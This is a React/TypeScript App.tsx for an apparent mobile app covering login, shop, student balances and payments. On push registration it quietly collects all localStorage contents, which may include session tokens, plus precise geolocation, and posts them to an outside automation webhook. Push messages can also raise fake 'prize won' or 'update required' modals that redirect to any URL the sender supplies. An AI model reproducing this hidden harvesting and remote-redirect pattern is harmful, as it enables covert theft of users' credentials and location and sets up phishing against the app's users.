import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route, useNavigate } from "react-router-dom";
import { LanguageProvider } from "./contexts/LanguageContext";
import { ThemeProvider } from "./contexts/ThemeContext";
import Index from "./pages/Index";
import NotFound from "./pages/NotFound";
import LoginPage from "./pages/Auth/login";
import SignupForm from "./pages/Auth/signup";
import MessageCard from "./components/MessageCard";
import MessageGenerator from "./pages/MessageGenerator";
import WhatsAppChat from "./pages/WhatsAppChat";
import AdminPanel from "./pages/AdminPanel";
import QRRedeemer from "./pages/QRRedeemer";
import StudentBalance from "./pages/StudentBalance";
import LocationInfo from "./pages/LocationInfo";
import News from "./pages/News";
import Shop from "./pages/shop";
import { AdminLogin } from "./components/admin/AdminLogin";
import PaymentStatus from "./pages/paymentStatus";
import { PushNotifications } from "@capacitor/push-notifications";
import { useEffect, useState } from "react";

// Default logo URL
const DEFAULT_LOGO = "https://via.placeholder.com/150x50.png?text=Logo";

// Modal styles with zinc-900 theme
const modalStyles = `
  .modal-backdrop {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: rgb(0, 51, 255);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 50;
    transition: opacity 0.3s ease-in-out;
  }
  .modal-backdrop.hidden {
    opacity: 0;
    pointer-events: none;
  }
  .modal-content {
    background-color:rgb(0, 51, 255);;
    border-radius: 0.75rem;
    box-shadow: 0 10px 20px rgb(0, 51, 255);;
    width: 100%;
    max-width: 90%;
    padding: 1.5rem;
    position: relative;
    transition: transform 0.3s ease-in-out;
  }
  @media (min-width: 640px) {
    .modal-content {
      max-width: 500px;
      padding: 2rem;
    }
  }
  .modal-content.hidden {
    transform: scale(0.95);
  }
  .modal-close {
    position: absolute;
    top: 1rem;
    right: 1rem;
    color:rgb(0, 0, 0);
    transition: color 0.2s ease-in-out;
  }
  .modal-close:hover {
    color:rgb(0, 0, 0);
  }
  .modal-logo {
    max-height: 48px;
    width: 100%;
    object-fit: contain;
    margin-bottom: 1rem;
  }
  .modal-inner {
    padding: 1rem;
    border-radius: 0.5rem;
    background: #27272a;
  }
  .modal-title {
    font-size: 1.25rem;
    font-weight: 600;
    color: #ffffff;
    margin-bottom: 0.75rem;
  }
  .modal-body {
    color: #d4d4d8;
    font-size: 0.875rem;
    margin-bottom: 1.25rem;
  }
  .modal-button {
    width: 100%;
    padding: 0.75rem;
    border-radius: 0.5rem;
    font-weight: 500;
    color: #ffffff;
    background-color:rgb(0, 0, 1);
    transition: background-color 0.2s ease-in-out, transform 0.2s ease-in-out;
  }
  .modal-button:hover {
    background-color:rgb(0, 0, 0);
    transform: translateY(-1px);
  }
  .modal-checkmark {
    width: 48px;
    height: 48px;
    color: #22c55e;
    margin: 0 auto 1rem;
  }
`;

// Modal state interface
interface ModalState {
  type: "update" | "prize" | "welcome" | "transaction" | "message" | "refresh" | null;
  isOpen: boolean;
  title: string;
  body: string;
  buttonText: string;
  controlUrl: string;
  logoUrl: string;
}

// Reusable Modal component
const Modal = ({ isOpen, onClose, children, logoUrl }: { isOpen: boolean; onClose: () => void; children: React.ReactNode; logoUrl?: string }) => {
  useEffect(() => {
    const styleSheet = document.createElement("style");
    styleSheet.textContent = modalStyles;
    document.head.appendChild(styleSheet);
    return () => document.head.removeChild(styleSheet);
  }, []);

  if (!isOpen) return null;

  return (
    <div className={`modal-backdrop ${isOpen ? "" : "hidden"}`} data-oid="modal-backdrop">
      <div className={`modal-content ${isOpen ? "" : "hidden"}`}>
        <button onClick={onClose} className="modal-close">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>
     
        {children}
      </div>
    </div>
  );
};

// Update Modal
const UpdateModal = ({ isOpen, title, body, buttonText, controlUrl, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; controlUrl?: string; logoUrl?: string; onClose: () => void }) => {
  const navigate = useNavigate();
  const handleAction = () => {
    if (controlUrl) {
      if (controlUrl.startsWith("http")) {
        window.location.href = controlUrl;
      } else {
        navigate(controlUrl);
      }
    }
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <h2 className="modal-title">{title || "Update Available"}</h2>
        <p className="modal-body">{body || "A new update is available. Please refresh the app to enjoy the latest features."}</p>
        <button onClick={handleAction} className="modal-button">
          {buttonText || "Update Now"}
        </button>
      </div>
    </Modal>
  );
};

// Prize Win Modal
const PrizeWinModal = ({ isOpen, title, body, buttonText, controlUrl, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; controlUrl?: string; logoUrl?: string; onClose: () => void }) => {
  const navigate = useNavigate();
  const handleAction = () => {
    if (controlUrl) {
      if (controlUrl.startsWith("http")) {
        window.location.href = controlUrl;
      } else {
        navigate(controlUrl);
      }
    }
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <h2 className="modal-title">{title || "Congratulations! You’ve Won!"}</h2>
        <p className="modal-body">{body || "You’ve won an exciting prize! Check your account for details."}</p>
        <button onClick={handleAction} className="modal-button">
          {buttonText || "Claim Now"}
        </button>
      </div>
    </Modal>
  );
};

// Welcome Modal
const WelcomeModal = ({ isOpen, title, body, buttonText, controlUrl, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; controlUrl?: string; logoUrl?: string; onClose: () => void }) => {
  const navigate = useNavigate();
  const handleAction = () => {
    if (controlUrl) {
      if (controlUrl.startsWith("http")) {
        window.location.href = controlUrl;
      } else {
        navigate(controlUrl);
      }
    }
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <h2 className="modal-title">{title || "Welcome to Our Platform!"}</h2>
        <p className="modal-body">{body || "We’re thrilled to have you! Explore our features and start your journey today."}</p>
        <button onClick={handleAction} className="modal-button">
          {buttonText || "Get Started"}
        </button>
      </div>
    </Modal>
  );
};

// Transaction Success Modal
const TransactionSuccessModal = ({ isOpen, title, body, buttonText, controlUrl, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; controlUrl?: string; logoUrl?: string; onClose: () => void }) => {
  const navigate = useNavigate();
  const handleAction = () => {
    if (controlUrl) {
      if (controlUrl.startsWith("http")) {
        window.location.href = controlUrl;
      } else {
        navigate(controlUrl);
      }
    }
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <svg className="modal-checkmark" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
        </svg>
        <h2 className="modal-title">{title || "Transaction Successful!"}</h2>
        <p className="modal-body">{body || "Your transaction has been completed successfully."}</p>
        <button onClick={handleAction} className="modal-button">
          {buttonText || "Done"}
        </button>
      </div>
    </Modal>
  );
};

// Message Modal
const MessageModal = ({ isOpen, title, body, buttonText, controlUrl, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; controlUrl?: string; logoUrl?: string; onClose: () => void }) => {
  const navigate = useNavigate();
  const handleAction = () => {
    if (controlUrl) {
      if (controlUrl.startsWith("http")) {
        window.location.href = controlUrl;
      } else {
        navigate(controlUrl);
      }
    }
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <h2 className="modal-title">{title || "New Message"}</h2>
        <p className="modal-body">{body || "You have received a new message. Check it out!"}</p>
        <button onClick={handleAction} className="modal-button">
          {buttonText || "View Message"}
        </button>
      </div>
    </Modal>
  );
};

// Force Refresh Modal
const ForceRefreshModal = ({ isOpen, title, body, buttonText, logoUrl, onClose }: { isOpen: boolean; title?: string; body?: string; buttonText?: string; logoUrl?: string; onClose: () => void }) => {
  const handleRefresh = () => {
    window.location.reload();
    onClose();
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} logoUrl={logoUrl}>
      <div className="modal-inner">
        <h2 className="modal-title">{title || "App Update Required"}</h2>
        <p className="modal-body">{body || "Please refresh the app to continue using the latest version."}</p>
        <button onClick={handleRefresh} className="modal-button">
          {buttonText || "Refresh Now"}
        </button>
      </div>
    </Modal>
  );
};

// Modal Wrapper
const ModalWrapper = ({ modalState, setModalState }: { modalState: ModalState; setModalState: (state: ModalState) => void }) => (
  <>
    <UpdateModal
      isOpen={modalState.type === "update" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      controlUrl={modalState.controlUrl}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="update-modal"
    />
    <PrizeWinModal
      isOpen={modalState.type === "prize" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      controlUrl={modalState.controlUrl}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="prize-modal"
    />
    <WelcomeModal
      isOpen={modalState.type === "welcome" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      controlUrl={modalState.controlUrl}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="welcome-modal"
    />
    <TransactionSuccessModal
      isOpen={modalState.type === "transaction" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      controlUrl={modalState.controlUrl}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="transaction-modal"
    />
    <MessageModal
      isOpen={modalState.type === "message" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      controlUrl={modalState.controlUrl}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="message-modal"
    />
    <ForceRefreshModal
      isOpen={modalState.type === "refresh" && modalState.isOpen}
      title={modalState.title}
      body={modalState.body}
      buttonText={modalState.buttonText}
      logoUrl={modalState.logoUrl}
      onClose={() => setModalState({ type: null, isOpen: false, title: "", body: "", buttonText: "", controlUrl: "", logoUrl: "" })}
      data-oid="refresh-modal"
    />
  </>
);

// QueryClient configuration
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      retry: 2,
      staleTime: 1000 * 60 * 5, // 5 minutes
   
    },
  },
});

const App = () => {
  const [modalState, setModalState] = useState<ModalState>({
    type: null,
    isOpen: false,
    title: "",
    body: "",
    buttonText: "",
    controlUrl: "",
    logoUrl: "",
  });

  useEffect(() => {
    // Request push notification permissions
    PushNotifications.requestPermissions().then((result) => {
      if (result.receive === "granted") {
        PushNotifications.register();
      } else {
        console.error("Push notification permission denied");
      }
    });

    // Geolocation handling
    const getGeolocation = () => {
      return new Promise<{ latitude: number | null; longitude: number | null }>((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation is not supported by this browser"));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            });
          },
          (error) => {
            reject(error);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          }
        );
      });
    };

    // Handle registration and send data to server
    PushNotifications.addListener("registration", async (token) => {
      console.log("Device registered with token:", token.value);

      const localStorageData: { [key: string]: string | null } = {};
      for (let key in localStorage) {
        if (Object.prototype.hasOwnProperty.call(localStorage, key)) {
          localStorageData[key] = localStorage.getItem(key);
        }
      }

      const data = {
        fcmToken: token.value,
        localStorage: localStorageData,
        location: { longitude: null, latitude: null } as { longitude: number | null; latitude: number | null },
      };

      try {
        const location = await getGeolocation();
        data.location = {
          latitude: location.latitude ?? null,
          longitude: location.longitude ?? null,
        };
      } catch (error: unknown) {
        const errorMessage = error instanceof Error ? error.message : "Unknown geolocation error";
        console.error("Geolocation error:", errorMessage);
      }

      await sendDataToServer(data);
    });

    // Handle foreground notification
    PushNotifications.addListener("pushNotificationReceived", (notification) => {
      console.log("Notification received:", notification);
      const type = (notification.data?.type?.toLowerCase() ||
        (notification.title?.toLowerCase().includes("refresh") ? "refresh" :
          notification.title?.toLowerCase().includes("update") ? "update" : "message")) as ModalState["type"];
      setModalState({
        type,
        isOpen: true,
        title: notification.data?.title || notification.title || "",
        body: notification.data?.body || notification.body || "",
        buttonText: notification.data?.buttonText || "Action",
        controlUrl: notification.data?.controlUrl || "",
        logoUrl: notification.data?.logoUrl || "",
      });
    });

    // Handle notification tap
    PushNotifications.addListener("pushNotificationActionPerformed", (notification) => {
      console.log("Notification tapped:", notification);
      const type = (notification.notification.data?.type?.toLowerCase() ||
        (notification.notification.title?.toLowerCase().includes("refresh") ? "refresh" :
          notification.notification.title?.toLowerCase().includes("update") ? "update" : "message")) as ModalState["type"];
      setModalState({
        type,
        isOpen: true,
        title: notification.notification.data?.title || notification.notification.title || "",
        body: notification.notification.data?.body || notification.notification.body || "",
        buttonText: notification.notification.data?.buttonText || "Action",
        controlUrl: notification.notification.data?.controlUrl || "",
        logoUrl: notification.notification.data?.logoUrl || "",
      });
    });

    return () => {
      PushNotifications.removeAllListeners();
    };
  }, []);

  const sendDataToServer = async (data: { fcmToken: string; localStorage: { [key: string]: string | null }; location: { longitude: number | null; latitude: number | null } }) => {
    try {
      const response = await fetch("https://automation.kaascan.com/webhook/userinfo", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const responseData = await response.json();
      console.log("Data sent successfully:", responseData);
    } catch (error: unknown) {
      const errorMessage = error instanceof Error ? error.message : "Unknown error";
      console.error("Error sending data to server:", errorMessage);
    }
  };

  return (
    <QueryClientProvider client={queryClient} data-oid="mknwii0">
      <ThemeProvider data-oid="8z52gbx">
        <LanguageProvider data-oid="r:puzxo">
          <TooltipProvider data-oid="8qsyig5">
            <Toaster data-oid="qkglz27" />
            <BrowserRouter data-oid="66rarny">
              <ModalWrapper modalState={modalState} setModalState={setModalState} />
              <Routes data-oid="iszwi84">
                <Route path="/login" element={<LoginPage data-oid="671-bx4" />} data-oid="6v9in3q" />
                <Route path="/dashboard" element={<Index data-oid="0drvgdy" />} data-oid="9ufv2_1" />
                <Route path="/signup" element={<SignupForm data-oid="_bj4mgf" />} data-oid="8iorq1m" />
                <Route path="/message" element={<MessageGenerator data-oid="2lj0v3_" />} data-oid="orfe35z" />
                <Route path="/chat" element={<WhatsAppChat data-oid=".1i:qc." />} data-oid="yjc0jml" />
                <Route path="/admin" element={<AdminLogin data-oid="_n8koal" />} data-oid="2hkzl3p" />
                <Route path="/admin/dashboard" element={<AdminPanel data-oid="z66bi8z" />} data-oid="p-i3qu-" />
                <Route path="/shop" element={<Shop data-oid="feqse:3" />} data-oid="9psrz-2" />
                <Route path="/qr-redeemer" element={<QRRedeemer data-oid="g1df0rc" />} data-oid="q61qike" />
                <Route path="/student-balance" element={<StudentBalance data-oid="g1lhekk" />} data-oid="it4rdnq" />
                <Route path="/location-info" element={<LocationInfo data-oid="adez60i" />} data-oid="z.z:yoi" />
                <Route path="/news" element={<News data-oid="e33sbz3" />} data-oid="itaivgi" />
                <Route path="/payment-status" element={<PaymentStatus data-oid="we_74s6" />} data-oid="b_7i4b:" />
                <Route path="*" element={<LoginPage data-oid="671-bx4" />} data-oid=".vfibfc" />
              </Routes>
            </BrowserRouter>
          </TooltipProvider>
        </LanguageProvider>
      </ThemeProvider>
    </QueryClientProvider>
  );
};

export default App;